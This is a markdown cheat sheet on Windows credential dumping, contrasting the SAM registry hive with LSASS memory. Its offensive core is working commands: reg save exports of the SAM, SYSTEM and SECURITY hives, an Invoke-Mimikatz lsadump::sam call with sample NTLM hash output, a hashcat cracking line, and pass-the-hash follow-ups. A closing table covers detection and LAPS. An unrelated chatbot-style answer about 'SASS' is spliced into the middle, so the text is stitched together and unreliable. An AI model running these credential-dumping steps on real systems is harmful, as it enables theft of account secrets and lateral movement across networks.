# 💾 Windows Local Credential Dumping (SAM vs. LSASS) 

## 🎯 1. Overview & Core Differences: SAM vs. LSASS

Windows stores and manages credentials using two distinct subsystems: the on-disk **Security Account Manager (SAM)** database and the in-memory **Local Security Authority Subsystem Service (LSASS)** process.

```text
+---------------------------------------------------------------------------------------------------+
|                                  CREDENTIAL STORAGE ARCHITECTURE                                  |
+---------------------------------------------------------------------------------------------------+

             ON-DISK STORAGE                                       IN-MEMORY RUNTIME
       +-------------------------+                             +-------------------------+
       |   SAM Registry Hive     |                             |      LSASS Process      |
       |     (HKLM\SAM)          |                             |       (lsass.exe)       |
       +-------------------------+                             +-------------------------+
                    |                                                       |
                    v                                                       v
       • Local user NTLM hashes only                           • Active logon sessions (Domain & Local)
       • Encrypted with Syskey (HKLM\SYSTEM)                   • NTLM hashes, Kerberos TGT/TGS, cleartext
       • Static (stored on disk)                               • Dynamic (wiped on system reboot)
       • Offline/Registry dumping                              • Runtime memory injection / reading

```

---

### 📊 Comparative Analysis: SAM vs. LSASS

| Comparison Vector | Security Account Manager (SAM) | Local Security Authority Subsystem (LSASS) |
| --- | --- | --- |
| **Location** | On-Disk Hive (`C:\Windows\System32\config\SAM` or `HKLM\SAM`) | Live Memory space of `lsass.exe` |
| **Accounts Stored** | **Local accounts only** (e.g., local `Administrator`, `Guest`, local users) | **Both Domain and Local accounts** currently logged in or with active cached tokens |
| **Credential Types** | Local NTLM hashes (and LM hashes if enabled) | NTLM hashes, Kerberos tickets (TGT/TGS), DPAPI keys, cleartext (legacy/WDigest) |
| **Decryption Key** | Requires the **Syskey / Boot Key** located inside `HKLM\SYSTEM` | Decrypted directly from memory via LSASS handle permissions |
| **Persistence** | Permanent (persists across system reboots) | Volatile (flushed and refreshed upon logoff / reboot) |
| **Detection Profile** | Registry hive export (`reg save`) or Volume Shadow Copy (VSS) | Direct process memory access (`OpenProcess` with `PROCESS_VM_READ`) |

---

## 🛠️ 2. Local Offline Credential Dumping via Registry Hives

Because the active SAM file is locked by the OS kernel at runtime, adversaries extract the registry hives using the built-in Windows `reg.exe` utility.

### Step 1: Export SAM and SYSTEM Hives

*Requires elevated local administrative privileges (`Administrator` / `SYSTEM`).*

```powershell
# 1. Save the SAM hive containing the encrypted local user hashes
reg save HKLM\SAM sam.save

# 2. Save the SYSTEM hive containing the Syskey (used to decrypt SAM)
reg save HKLM\SYSTEM system.save

# 3. (Optional) Save the SECURITY hive containing LSA secrets & cached domain credentials
reg save HKLM\SECURITY security.save

```

---

### Step 2: Decrypting the Hashes via `Invoke-Mimikatz`

Once the hives are exported to disk, feed them into Mimikatz's `lsadump::sam` module to parse and decrypt the local account NTLM hashes:

```powershell
# Import Invoke-Mimikatz into the current PowerShell session
. .\Invoke-Mimikatz.ps1

# Decrypt and dump local hashes from the saved registry files
Invoke-Mimikatz -Command "`"lsadump::sam /sam:sam.save /system:system.save`""

```

---

### Step 3: Understanding the Extracted Output

The output yields the account Relative Identifier (RID) and corresponding NTLM hashes:

```text
SAMKey : 3a8b...
RID  : 000001f4 (500)
User : Administrator
Hash NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000003e9 (1001)
User : LocalUser
Hash NTLM: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

```

* **RID 500:** Built-in default Administrator account.
* **NTLM Hash Format:** `LM_HASH : NTLM_HASH` (The first 32 characters `aad3...` represent the empty/disabled LM hash placeholder).

---

## 🚀 3. Attacker Post-Exploitation Paths

After obtaining the decrypted SAM hashes:

1. **Pass-the-Hash (PtH):** Re-use the local Administrator NTLM hash across other systems in the environment (abusing local administrator password reuse).
2. **Offline Hash Cracking:** Attempt recovery of cleartext passwords using Hashcat or John the Ripper (`hashcat -m 1000 hashes.txt rockyou.txt`).
3. **Password Spraying / Auditing:** Identify weak baseline password policies across workstations.

---

If you're talking about **Windows security**, **SAM** and **SASS** are different things. You may mean **LSASS** rather than SASS.

## Easy explanation SAM vs LSASS

| Feature      | **SAM**                                             | **LSASS**                                                         |
| ------------ | --------------------------------------------------- | ----------------------------------------------------------------- |
| Full name    | Security Account Manager                            | Local Security Authority Subsystem Service                        |
| Type         | Registry database                                   | Windows process/service                                           |
| Main purpose | Stores local user account information               | Enforces Windows security policies and handles authentication     |
| Contains     | Local usernames and password hashes                 | Authentication/security credentials and security tokens in memory |
| Location     | `C:\Windows\System32\config\SAM`                    | `C:\Windows\System32\lsass.exe`                                   |
| Runs as      | Not a normal process                                | `lsass.exe` process                                               |
| Example      | Local account `Administrator` and its password hash | Handles authentication when a user logs in                        |

## Simple way to remember

Think of Windows login like this:

**SAM = the database**
**LSASS = the security process that uses the database**

For a local account:

```text
User enters password
       ↓
     LSASS
       ↓
   checks authentication
       ↓
     SAM
       ↓
password information/hash
```

**Important:** LSASS is a critical Windows security process. If you see `lsass.exe` running, that is normally expected. A malicious program can also try to impersonate or interact with it, so its location and behavior matter.



## 🛡️ 4. Defensive Mitigations & Detection

| Attack Vector | Detection & Mitigation Strategy |
| --- | --- |
| **Registry Hive Export** | Monitor process execution and command-line arguments for `reg.exe save` targeting `HKLM\SAM`, `HKLM\SYSTEM`, or `HKLM\SECURITY` (Event ID 4688 / Sysmon Event ID 1). |
| **Local Admin Password Reuse** | Deploy **Microsoft LAPS (Local Administrator Password Solution)** to automatically randomize and manage unique local Administrator passwords on every machine. |
| **File Creation of Hive Backups** | Monitor file creation events for `.save`, `.bak`, or `.hiv` files in temporary or user directories (Sysmon Event ID 11). |

